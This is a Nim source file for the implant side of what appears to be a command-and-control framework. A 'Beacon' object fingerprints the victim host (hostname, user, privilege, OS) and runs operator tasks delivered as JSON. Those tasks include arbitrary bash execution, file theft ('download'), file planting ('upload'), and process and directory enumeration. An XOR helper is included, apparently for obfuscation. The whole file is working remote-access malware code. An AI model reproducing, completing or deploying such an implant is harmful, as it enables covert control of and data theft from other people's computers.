import json
import std/strutils
import os
import osproc
import std/base64
import std/random
import system
import posix
# import psutil


proc toString*(str: seq[uint8]): string =
  result = newStringOfCap(len(str))
  for ch in str:
    add(result, char(ch))


proc xorEncode*(key,data: string): seq[uint8] =
    var result: seq[uint8]
    
    var j = 0
    for i in countup(0,data.len-1):
        if (j == key.len):
            j = 0

        result.add(uint8(int(data[i])) xor uint8(int(key[j])))
        j=j+1

    return result


type 
    Beacon* = ref object of RootObj
        beaconHash*: string
        hostname*: string
        username*: string
        arch*: string
        privilege*: string
        os*: string
        sleepTimeMs*: int

        tasks: seq[JsonNode]
        taskResults*: seq[JsonNode]


proc initBeacon*(self: Beacon) =

    var alphabet = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
    randomize()
    var hash = ""
    for i in 0..32-1:
        hash = hash & alphabet[rand(len(alphabet)-1)]

    self.beaconHash = hash
    const size = 256

    let hostname = newString(size)
    var success = gethostname(hostname, size) == 0
    let nullPos = hostname.find('\0')
    self.hostname = hostname
    if nullPos != -1:
        let finalHostname = hostname.substr(0, nullPos - 1)
        self.hostname = finalHostname

    var uid = geteuid()
    var gid = getegid()

    var login: cstring
    login = getlogin()
    
    self.username = $login
    self.arch = hostCPU
    if gid==0 or uid==0:
        self.privilege = "high"
    else:
        self.privilege = "low"
    self.os = hostOS
    self.sleepTimeMs = 1000


proc cmdToTasks*(self: Beacon, input: string) =
    if(not isEmptyOrWhitespace(input)):
        var jsonNode = parseJson(input)
        for i in 0..len(jsonNode)-1:
            var b1 = jsonNode[i]
            var sessions = b1["sessions"]
            for j in 0..len(sessions)-1:
                var s1 = sessions[j]
                self.tasks.add(s1)
                # var instruction = s1["instruction"].getStr()
                # echo instruction


type
    FileExtract = object
        path*: string
        Isfile*: bool
        size*: BiggestInt
        permissions*: string
        linkCount*: BiggestInt
        lastAccessTime*: string
        lastWriteTime*: string
        creationTime*: string


proc ExtractInfo(path: string, info: FileInfo): FileExtract = 
    result = FileExtract(path: path , Isfile: if cmp($(info.kind), "pcFile") == 0 : true else: false, size: info.size, 
                              permissions: $(info.permissions), linkCount: info.linkCount, lastAccessTime: $(info.lastAccessTime), 
                              lastWriteTime: $(info.lastWriteTime), creationTime: $(info.creationTime))

proc execInstruction*(self: Beacon) =
    for it in self.tasks:
        var instruction = it["instruction"].getStr()
        var args = it["args"].getStr()
        var cmd = it["cmd"].getStr()
        var data = decode(it["data"].getStr())
        var inputFile = decode(it["inputFile"].getStr())
        var outputFile = decode(it["outputFile"].getStr())
        var pid = it["pid"].getInt()

        var result: string  
        case instruction:
            of "ls":
                var recurse = false
                var lst: seq[FileExtract]
                if cmd == "":
                    cmd = "./"
                if recurse:
                    for path in walkDirRec(cmd):
                        lst.add(ExtractInfo(path, getFileInfo(path)))
                else:
                    for _, path in walkDir(cmd):            
                        lst.add(ExtractInfo(path, getFileInfo(path)))
                
                # TODO print in unix style
                # for it in lst:
                #     result = result & it.permissions & " " & $(it.size) & " " & it.path & "\n"
                result = execProcess("bash", args=["-c", "ls -la"], options={poUsePath})
            of "ps":
                result = execProcess("bash", args=["-c", "ps -aux"], options={poUsePath})
            of "cd":
                setCurrentDir(cmd)
                result = getCurrentDir()
            of "pwd":
                result = getCurrentDir()
            of "download":
                if fileExists(inputFile):
                    var fileHandler = open(inputFile, fmRead)
                    data = fileHandler.readAll()
                    fileHandler.close()
                    result = "OK."
                else:
                    result = "File don't exists."
            of "upload":
                if fileExists(outputFile):
                    result = "File already exists."
                else:
                    var fileHandler = open(outputFile, fmWrite)
                    fileHandler.write(data)
                    fileHandler.close()
                    result = "OK."
            of "run":
                result = execProcess("bash", args=["-c", cmd], options={poUsePath})
            of "sleep":
                self.sleepTimeMs=parseInt(cmd)*1000
            else: 
                echo "cmd unrokonized" 

        var taskResult = %* {"args":args,"cmd":cmd,"data":encode(data),"inputFile":encode(inputFile),"instruction":instruction,"outputFile":encode(outputFile),"pid":pid,"returnValue":encode(result)}
        self.taskResults.add(taskResult)

    # cleaning
    var nbTasks = len(self.tasks)
    for i in 0..nbTasks-1:
        var tmp = self.tasks.pop()